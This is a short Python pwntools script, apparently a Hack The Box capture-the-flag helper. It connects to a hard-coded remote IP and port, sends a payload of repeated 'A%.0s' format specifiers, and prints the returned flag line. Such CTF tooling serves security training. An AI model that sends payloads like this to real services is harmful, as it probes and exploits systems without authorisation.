#!/usr/bin/python3.8

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '167.71.143.44' # Change this
PORT = 31068      # Change this

r    = remote(IP, PORT)

# Craft payload
payload = b'A%.0s' * 32 # Change the number of "A"s

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')